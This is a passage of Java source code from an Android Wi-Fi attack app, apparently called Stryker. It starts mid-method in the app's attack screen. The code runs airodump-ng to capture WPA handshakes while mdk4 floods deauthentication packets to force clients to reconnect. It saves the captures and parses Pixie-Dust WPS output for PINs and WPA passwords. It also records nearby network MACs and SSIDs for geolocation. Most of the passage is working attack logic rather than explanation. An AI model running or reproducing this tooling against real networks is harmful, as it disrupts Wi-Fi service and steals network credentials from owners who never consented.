                core.customCommand("rm /sdcard/Stryker/hs/handshakenow*.cap");
                core.customCommand("rm /sdcard/Stryker/hs/handshakenow*.csv");
                String cmd = "airodump-ng " + hsIface + " -w /sdcard/Stryker/hs/handshakenow --ignore-negative-one --output-format pcap,csv  --update 3";
                airodump = new AdvancedProcess(activity, context, cmd, true) {
                    @Override
                    public void onFinished(ArrayList<String> outputList) {
                        if (isAdded() && alive.get()) {
                            outputtext.setText("Attack finished due to error.\n");
                        }
                        try {
                            csvReader.get().cancel();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    @Override
                    public void onNewLine(String line) {

                        if (line.contains("WPA handshake")) {
                            Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
                            if (m.find()) {
                                if (!hs.contains(m.group())) {
                                    hs.add(m.group());
                                    totalSuccess[0]++;
                                    if (isAdded() && alive.get()) {
                                        timertext.setText("Success: " + totalSuccess[0]);
                                    }
                                }
                            }
                        }

                    }

                    @Override
                    public void onEvent(String line) {

                    }
                };
                airodump.setNoLog(true);
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }

            boolean s = core.checkFile("/sdcard/Stryker/hs/handshakenow-01.csv");
            if (s) {
                final String[] packet = {""};
                csvReader.set(new Timer());
                csvReader.get().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        List<List<String>> records = new ArrayList<>();
                        try (BufferedReader br = new BufferedReader(new FileReader("/sdcard/Stryker/hs/handshakenow-01.csv"))) {
                            String line;
                            while ((line = br.readLine()) != null) {
                                String[] values = line.split(",");
                                records.add(Arrays.asList(values));
                            }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        for (List<String> line : records) {
                            if (line.size() > 1) {
                                if (line.get(0).equals("BSSID")) {
                                    safeUi(() -> {
                                        try {

                                            successtext.setText("Devices: " + devices.size());
                                            progress.setText("Networks: " + networksHS.size());
                                            StringBuilder sb = new StringBuilder();
                                            if (hs.size() > 0) {
                                                sb.append("\n\nHS: ");
                                                for (String s : hs) {
                                                    if (core.getBoolean("hide")) {
                                                        sb.append(Core.HIDDEN_MAC).append(" ");
                                                    } else {
                                                        sb.append(s).append(" ");
                                                    }
                                                }

                                            }
                                            sb.append("\n\nNetworks: ");
                                            for (WiFINetwork network : networksHS) {
                                                sb.append(network.getSsid()).append(" ");
                                            }
                                            sb.append("\n\nPacket: ").append(packet[0]);
                                            sb.append("\n\nDevices: ");
                                            for (String d : devices) {
                                                sb.append(d).append(" ");
                                            }
                                            outputtext.setText(sb.toString());
                                        } catch (Exception e) {
                                            e.printStackTrace();
                                        }


                                    });

                                    devices.clear();
                                    networksHS.clear();
                                    device[0] = false;
                                }
                                if (line.get(0).equals("Station MAC")) {
                                    device[0] = true;

                                }
                                if (!device[0] && !line.get(0).equals("BSSID")) {
                                    WiFINetwork temp = new WiFINetwork();
                                    temp.setMac(line.get(0));
                                    temp.setSsid(line.get(line.size() - 2));
                                    if (!networksHS.contains(temp) && !temp.getSsid().equals("")) {
                                        networksHS.add(temp);
                                        wifimacs.add(temp.getMac());
                                        if (core.getBoolean("geomac_bg_scan")) {
                                            com.zalexdev.stryker.geomac.GeoHooks.recordScan(
                                                    context, temp.getMac(), temp.getSsid());
                                        }
                                    }
                                }
                                if (device[0] && !devices.contains(line.get(0)) && !line.get(0).equals("Station MAC") && !wifimacs.contains(line.get(0))) {
                                    devices.add(line.get(0));
                                }


                            }
                        }
                    }
                }, 0, 2500);
                mdk4 = new AdvancedProcess(activity, context, "mdk4 " + core.getDeauthInterface() + " d", true) {
                    @Override
                    public void onFinished(ArrayList<String> outputList) {
                        core.toaster("Mdk4 stopped");
                        packet[0] = "Deauth stopped due critical error";
                    }

                    @Override
                    public void onNewLine(String line) {
                        if (line.contains("Packets sent")) {
                            packet[0] = line;
                        }
                    }

                    @Override
                    public void onEvent(String line) {

                    }
                };

            } else {
                safeUi(() -> outputtext.setText("Failed to start attack. Please try again."));
            }
        }).start();
        stop.setOnClickListener(v -> {
            if (mdk4 != null) {
                mdk4.kill();
            }
            if (airodump != null) {
                airodump.kill();
            }
            try {
                csvReader.get().cancel();
            } catch (Exception e) {
                e.printStackTrace();
            }
            stop.setVisibility(View.GONE);
            dialog.setCancelable(true);
            outputcard.setVisibility(View.GONE);
            resulttext.setVisibility(View.VISIBLE);
            if (hs.size() > 0) {
                resulttext.setText("Success: " + totalSuccess[0] + "\nFile saved to: /sdcard/Stryker/captured");
                Date date = new Date();
                SimpleDateFormat formatter = new SimpleDateFormat("dd-MM_HH:mm", Locale.ENGLISH);
                String strDate = formatter.format(date);
                core.moveFile("/sdcard/Stryker/hs/handshakenow-01.cap", "/sdcard/Stryker/captured/MassHS_" + hs.size() + "_" + strDate + ".cap");
            } else {
                resulttext.setText("Failed to capture handshake");
            }
            new Thread(() -> {
                core.killWifiAttackTools();
                core.monitorManager.disableMonitorMode(core.getHSInterface());
                core.monitorManager.disableMonitorMode(core.getDeauthInterface());
            }).start();

        });

        dialog.show();
    }

    public void runDeauth() {
        CharSequence[] labels = new CharSequence[WifiJamFragment.MODES.length];
        for (int i = 0; i < WifiJamFragment.MODES.length; i++) {
            labels[i] = WifiJamFragment.MODES[i].title;
        }
        new MaterialAlertDialogBuilder(context)
                .setTitle("mdk4 mode")
                .setItems(labels, (d, which) -> {
                    WifiJamFragment.Mode mode = WifiJamFragment.MODES[which];
                    WifiJamFragment.launchMdk4(activity, context, core, mode.flag, mode.title);
                })
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    public void smoothScrool(TextView outputtext) {
        if (outputtext != null && outputtext.getLayout() != null) {
            int lineCount = outputtext.getLineCount();
            if (lineCount > 100) {
                outputtext.setText("");
            }
            final int scrollAmount = outputtext.getLayout().getLineTop(outputtext.getLineCount()) - outputtext.getHeight();
            outputtext.scrollTo(0, Math.max(scrollAmount, 0));
        }
    }

    private void restoreWpsInterface() {
        new Thread(() -> {
            String wpsIface = core.getWPSInterface();
            if (wpsIface != null && wpsIface.length() > 0) {
                core.customCommand("ifconfig " + wpsIface + " up", true);
            }
            String hsIface = core.getHSInterface();
            if (hsIface != null && hsIface.length() > 0 && !hsIface.equals(wpsIface)) {
                core.customCommand("ifconfig " + hsIface + " up", true);
            }
            if (core.isPixieIfaceDown()) {
                core.customCommand("svc wifi enable", true);
            }
        }).start();
    }

    public WiFINetwork pixieParse(ArrayList<String> out) {
        String pin;
        String pass;

        WiFINetwork back = new WiFINetwork();
        for (int i = 0; i < out.size(); i++) {
            String s = out.get(i);
            if (s.contains("[+] WPS pin:")) {
                pin = s.replace("[+] WPS pin: ", "").replaceAll("'", "");
                back.setPin(pin);
                back.setOK(true);
            }
            if (s.contains("[+] WPS PIN:")) {
                pin = s.replace("[+] WPS PIN: ", "").replaceAll("'", "");
                back.setPin(pin);
                back.setOK(true);
            }
            if (s.contains("[+] WPA PSK:")) {
                pass = s.replace("[+] WPA PSK: ", "").replaceAll("'", "");
                back.setPsk(pass);
                back.setOK(true);
            }
        }
        return back;
    }

    @Override
    public void onDestroyView() {
        super.onDestroyView();
        if (img != null) {
            try {
                img.cancelAnimation();
            } catch (Exception ignored) {
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        alive.set(false);
        cancelBackgroundWork();
    }

    private void cancelBackgroundWork() {
        try {
            if (scanThread != null) {
                scanThread.interrupt();
            }
        } catch (Exception ignored) {
        }
        try {
            if (attackThread != null) {
                attackThread.interrupt();
            }
        } catch (Exception ignored) {
        }
        try {
            if (pixieProcess != null) {
                pixieProcess.kill();
            }
        } catch (Exception ignored) {
        }
        try {
            if (mdk4 != null) {
                mdk4.kill();
            }
        } catch (Exception ignored) {
        }
        try {
            if (airodump != null) {
                airodump.kill();
            }
        } catch (Exception ignored) {
        }
    }
}
